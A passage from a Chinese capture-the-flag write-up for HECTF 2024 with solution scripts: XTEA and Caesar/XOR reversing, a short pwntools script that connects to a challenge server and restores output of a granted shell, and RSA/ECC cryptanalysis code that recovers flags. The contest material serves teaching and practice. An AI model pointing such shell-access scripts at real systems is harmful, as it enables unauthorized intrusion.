class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x54434548</span>, <span class="number">0x32303246</span>, <span class="number">0x69617734</span>, <span class="number">0x756F7974</span>]</span><br><span class="line"></span><br><span class="line">encrypted = [<span class="number">0x0DF596194</span>, <span class="number">0x2CFE74D6</span>, <span class="number">0x1355AE4D</span>, <span class="number">0x0B6717A87</span>, <span class="number">0x0F27BB57B</span>, <span class="number">0x8D436C5</span>, <span class="number">0x0C5C8E1AF</span>, <span class="number">0x0A85BD8F</span>, <span class="number">0x19A70032</span>, <span class="number">0x400CFEF4</span>, <span class="number">0x0AF02E1FC</span>, <span class="number">0x0CDEDCFB4</span>]</span><br><span class="line"></span><br><span class="line">decrypted = []</span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)//<span class="number">2</span>):</span><br><span class="line">    now = decrypt(encrypted[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    decrypted += now</span><br><span class="line">    final += long_to_bytes(now[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(now[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;58de01fc-af6b-8cf6-e8ca-db5964ce0b1e&#125;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easyree"><a href="#easyree" class="headerlink" title="easyree"></a>easyree</h3><blockquote><p>flag格式HECTF{xxxx}</p></blockquote><p>16进制查看，改 <code>CTF</code> 为 <code>UPX</code>，脱壳。</p><p>IDA分析，在 <code>main()</code> 函数中，先经过 <code>encrypt()</code> 函数变种凯撒移位，再简单异或操作。</p><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">35</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">126</span>, <span class="number">40</span>, <span class="number">70</span>, <span class="number">82</span>, <span class="number">4</span>, <span class="number">75</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">3</span>, <span class="number">82</span>, <span class="number">4</span>, <span class="number">72</span>, <span class="number">79</span>, <span class="number">123</span>, <span class="number">79</span>, <span class="number">125</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">4</span>, <span class="number">79</span>, <span class="number">73</span>, <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        m.append((c[i]^k)+<span class="number">21</span>)</span><br><span class="line">    mb = <span class="built_in">bytes</span>(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> mb <span class="keyword">and</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> mb <span class="keyword">and</span> mb.isascii():</span><br><span class="line">        <span class="built_in">print</span>(k, mb)</span><br><span class="line">        tot = <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">            <span class="keyword">if</span> m[j] &gt; <span class="number">96</span> <span class="keyword">and</span> m[j] &lt;= <span class="number">122</span>:</span><br><span class="line">                m[j] = (m[j] - <span class="number">97</span> - tot) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">                tot += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> m[j] &gt; <span class="number">65</span> <span class="keyword">and</span> m[j] &lt;= <span class="number">90</span>:</span><br><span class="line">                m[j] = (m[j] - <span class="number">65</span> - tot) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">                tot += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 24 b&#x27;PNMER&#123;Es_1h_i0_1elxlzoq1lf&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Re_1s_s0_1nterest1ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a>sign in</h3><blockquote><p>快来签到吧……</p></blockquote><p><code>close(1)</code> 关闭了输出，重定向即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;8.153.103.216&#x27;</span>,<span class="number">32544</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;HECTF2024!&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="迷茫的艾米莉"><a href="#迷茫的艾米莉" class="headerlink" title="迷茫的艾米莉"></a>迷茫的艾米莉</h3><blockquote><p>在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p></blockquote><p>栅栏6+vigenere密码（key=responsibility）。</p><p>flag：<code>HECTF&#123;C0ng2at51ations_0n_comin9_in&#125;</code>。</p><p>​    </p><h3 id="seven-more"><a href="#seven-more" class="headerlink" title="seven more"></a>seven more</h3><blockquote><p>more than more no co-prime</p></blockquote><p>给了 $p,q$，且 $\gcd(e,p)=e,\gcd(e,q)=e’,e’ \mid e$。</p><p>分别在 $\mod p$ 和 $\bmod q$ 上使用AMM算法求根，最后CRT找flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - discrete_log(a, d)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line">    </span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line">e = <span class="number">1009</span> * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gcd(e,p-1)=7063</span></span><br><span class="line"><span class="comment"># gcd(e,q-1)=1009</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p</span></span><br><span class="line">cp = c % p</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(mps))</span><br><span class="line"></span><br><span class="line"><span class="comment"># q</span></span><br><span class="line">e2 = <span class="number">1009</span></span><br><span class="line">d2 = inverse(e//<span class="number">1009</span>, q-<span class="number">1</span>)</span><br><span class="line">cq = <span class="built_in">pow</span>(c, d2, q)</span><br><span class="line">mq = AMM(cq, e2, q)</span><br><span class="line">q_proot = findAllPRoot(q, e2)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q, e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(mqs))</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> tqdm(mps):</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        m = CRT_list([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        res = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;HECTF&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="comment">#print(time.time() - start)</span></span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 79%|███████████████████████████████████████████████████████████████▉                 | 5573/7063 [04:08&lt;01:05, 22.78it/s]b&#x27;HECTF&#123;go0d_jOb_At_AmM&#125;D~u3&lt;1\xdd\x9f\x81b:,\xbe\xf2\x1c\xf1\xd5\xeeN\xb7w\xce\xae?\xf3~\x99\xbd\xce\xf1\xf1\x10&quot;\xc6:\x85\x08\xf0\xef4h\x8c%d\x9f\xf1\xaf\xfdS\xd1\xcc\x99\x1c\xc3\xe5\x06Z\xdags\xb5R&gt;\xc9\xd4\xb7\x99\xde\x9f\xb0\xccP\xf2\xba\x82A\xfd\xbb\xda\x0e\xf9\xa5\xaa\xfcm\x92\xba\xa8\xff\xf8*\x8a\x95p\xb6\xbe\xc5\xbf\xbe\xe8c&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="翻一翻"><a href="#翻一翻" class="headerlink" title="翻一翻"></a>翻一翻</h3><blockquote><p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p></blockquote><p><code>emirp()</code> 函数表示反素数，$q$ 为 $p$ 的十进制反素数。</p><p>参考ASIS 2015 Finals - RSASR，按位爆破，结合条件剪枝。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>((a,b))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># we try to guess the last not-already-guessed digits of both primes</span></span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too large</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too small</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1)%(<span class="number">10</span>**(k+<span class="number">1</span>))) != (n%(<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span></span><br><span class="line"><span class="comment">#for i in range(10):</span></span><br><span class="line"><span class="comment">#    t(i*(10**77), i*(10**77), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201, 10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393)</span></span><br><span class="line"></span><br><span class="line">p,q = (<span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span>, <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span>)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SEVDVEZ7SV9yZWExbHlfbDB2ZV9jMnlwdG8hfQ==&#x27;</span></span><br><span class="line"><span class="comment"># HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="不合格的魔药"><a href="#不合格的魔药" class="headerlink" title="不合格的魔药"></a>不合格的魔药</h3><blockquote><p>刚开始学习魔药的小A总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息“保密”的效果了，请从这份面目全非的成品中还原出小A想隐藏的信息</p><p>[hint1] key&lt;60000</p></blockquote><p>第一步，由 $\text{order}=p+1$ 尝试MOV attack无果，后根据hint1，爆破 $k$ 值。</p><p>第二步，密文满足：</p><p>$(2G)_x \oplus c_0 = C_0,(2G)_y \oplus c_1 = C_1$</p><p>$(4G)_x \oplus c_2 = C_2,(4G)_y \oplus c_3 = C_3$</p><p>由于 $c_i$ 只有16*8=128位，异或过程中只会改变 $(kG)_x$ 或 $(kG)_y$ 的低128位值，即高位已知，结合ECC方程利用coppersmith求解 $2G$ 和 $4G$，再异或还原回 $c_i$。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># from https://github.com/defund/coppersmith/blob/master/coppersmith.sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">                d = f.degree()</span><br><span class="line"></span><br><span class="line">        R = 